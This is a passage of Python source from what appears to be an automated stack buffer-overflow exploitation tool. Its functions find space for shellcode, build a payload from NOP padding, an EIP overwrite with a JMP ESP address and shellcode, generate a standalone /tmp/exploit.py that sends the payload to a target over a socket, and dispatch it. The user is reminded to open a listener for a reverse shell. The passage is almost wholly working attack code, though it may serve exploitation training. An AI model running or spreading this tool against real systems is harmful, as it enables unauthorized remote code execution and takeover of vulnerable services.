        return BOFErrorSuccess

    # @function expand_space
    # @abstract Attempt to expand the available space to store the shellcode.
    # @discussion In order for the shellcode to be injected, there must be sufficient space to store
    #             it. This function invokes _check_space() with space = len(@self._shellCode) to check
    #             if the shellcode could be placed in ESP. If not, it would proceed to _find_space() to
    #             locate space before EIP.
    #             Note that generate_shellcode() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
    #             payload; BOFErrorServiceAlive if service did not crash; BOFErrorInvalid if shellcode
    #             is not generated or ESP padding is not set.

    def expand_space(self) -> int:
        self._func_log("Expanding space...")

        if self._spaceExpanded:
            return BOFErrorSuccess

        if not self._shellCodeGenerated:
            self._err_log("Please first generate the shellcode!")
            return BOFErrorInvalid

        if not self._espPaddingSet:
            self._err_log("Please manually set the ESP padding!")
            return BOFErrorInvalid

        if self._check_space(len(self._shellCode)):
            self._shellCodeInESP = True
            self._spaceExpanded = True
            return BOFErrorSuccess

        self._shellCodeInESP = False
        self._step_log("Unable to perform expansion. Proceeding to find space...")
        return self._find_space()

    # @function _build_exploit
    # @abstract Build @self._exploit with the other functions executed.
    # @result   BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked
    #           or if the entered return address is invalid..

    def _build_exploit(self) -> int:
        self._func_log("Building exploit...")

        if not self._spaceExpanded:
            self._err_log("Please first expand space for shellcode!")
            return BOFErrorInvalid

        # Find return address (JMP ESP)
        self._prompt_log("Tip: !mona find -s \"\\xff\\xe4\"")
        ans = self._input("Enter address to overwrite EIP with: ").lower().replace("\\x", "").replace("0x", "")
        if not is_hex(ans) or len(ans) != 8:
            self._err_log("Address invalid!")
            return BOFErrorInvalid
        self._eip = pack("<I", int(ans, 16))
        if self._shellCodeInESP:
            self._exploit = b"\x90" * self._eipOffset + self._eip + b"\x90" * self._espPadding + self._shellCode
        else:
            self._exploit = self._shellCode + b"\x90" * (self._stackSpace - len(self._shellCode)) + self._eip + \
                            b"\x90" * self._espPadding + self._firstStage

        if self._strict:
            self._endPadding = self._numBytes - len(self._exploit)
            if self._endPadding > 0:
                self._exploit += b"\x90" * self._endPadding

        self._success_log("Exploit built successfully!", True)
        return BOFErrorSuccess

    # @function generate_file
    # @abstract Build a Proof of Concept script with the information gathered by other functions.
    # @discussion The generated script, /tmp/exploit.py, would be in Python 2 format due to issues with
    #             Python 3 encoding.
    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if the exploit is not built successfully.

    def generate_file(self) -> int:
        self._func_log("Generating exploit.py...")

        if not self._exploit:
            if self._build_exploit():
                return BOFErrorFailure

        heading = "#!/usr/bin/python\n" \
                  "import socket\n\n" \
                  "try:\n" \
                  "    print '(-) Initializing variables...'\n\n"
        variables = "    # %s - LHOST: %s - LPORT: %d\n" \
                    "    shellcode = (" % (self._shellCodeName, self._lIP, self._lPort)
        shell_str = bytes_escape_all(self._shellCode)
        len_shell = len(shell_str)
        for i in range(0, len_shell, 15):
            if i > 0:
                variables += "                 "
            variables += "'" + ''.join(shell_str[i:i + 15])
            if len_shell - i > 15:
                variables += "'\n"
        variables += "')\n\n"

        payload_str = ("    payload = %s" % self._prefix).replace("b'", "'")
        if not self._shellCodeInESP:
            payload_str += " + shellcode"
        variables += "    # Bad characters: 0x%s\n" % " 0x".join(self._badChars)

        variables += ""
        if self._shellCodeInESP:
            eip_offset = self._eipOffset
        else:
            eip_offset = self._eipOffset - len(self._shellCode)
        if eip_offset > 0:
            variables += "    filler = '\\x90' * %d\n" % eip_offset
            payload_str += " + filler"

        variables += "    eip = %s\n" % bytes_escape_all_str(self._eip)
        payload_str += " + eip"

        if self._espPadding > 0:
            variables += "    offset = 'B' * %d\n" % self._espPadding
            payload_str += " + offset"

        if self._shellCodeInESP:
            payload_str += " + shellcode"
        else:
            variables += "    # %s" % self._firstStageASM
            variables += ("    first_stage = %s\n" % bytes_escape_all_str(self._firstStage)).replace("b'", "'")
            payload_str += " + first_stage"

        if self._strict and self._endPadding > 0:
            payload_str += " + '\\x90' * %d" % self._endPadding
        payload_str += (" + %s\n\n" % self._suffix).replace("b'", "'")
        variables += payload_str.replace("'' + ", "").replace(" + ''", "")

        if self._origHeader:
            variables += ("    buffer = %s\n"
                          "    buffer += payload\n\n" % self._origHeader).replace("    buffer = b", "    buffer = ")
            variables = self._process_header_file(variables)

        footing = "    print '(-) Sending payload...'\n" \
                  "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
                  "    s.connect(('%s', %d))\n" \
                  "    s.send(" % (self._ip, self._port)
        if self._origHeader:
            footing += "buffer"
        else:
            footing += "payload"

        footing += ")\n" \
                   "    s.close()\n" \
                   "    print '[+] Exploitation complete!'\n\n" \
                   "except:\n" \
                   "    print '(!!!) Exploitation failed!'\n" \
                   "    exit(0)\n"

        file = open("/tmp/exploit.py", "w")
        file.write(heading + variables + footing)
        file.close()
        self._success_log("Successfully generated /tmp/exploit.py!")
        self._fileGenerated = True
        return BOFErrorSuccess

    # @function send_exploit
    # @abstract Dispatch the exploit.
    # @result BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorFailure if
    #         the exploit is not built successfully or if exploitation failed.

    def send_exploit(self) -> int:
        self._func_log("Exploiting...")

        if not self._exploit:
            if self._build_exploit():
                return BOFErrorFailure

        self._prompt_log("Remember to open up a listener on port %d if you are using the shellcode "
                         "to gain a reverse shell!" % self._lPort)
        input()
        self._verify = False

        error = self.send_data(self._exploit, 5, False)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        if self._check_crash(error):
            self._err_log("Exploit failed. Try sending the payload manually.")
            return BOFErrorFailure

        self._success_log("Exploitation completed!!!")
        return BOFErrorSuccess

    # @function perform_bof
    # @abstract Perform a full BoF exploit with member functions.
    # @result True if succeeded; False if failed.

    def perform_bof(self) -> bool:
        if self.get_num_bytes() < 0:
            return False
        if self.get_eip_offset() < 0:
            return False
        if self.find_bad_chars():
            return False
        if self.generate_shellcode():
            return False
        if self.expand_space():
            return False
        if self.generate_file():
            return False
        if self.send_exploit():
            return False
        return True
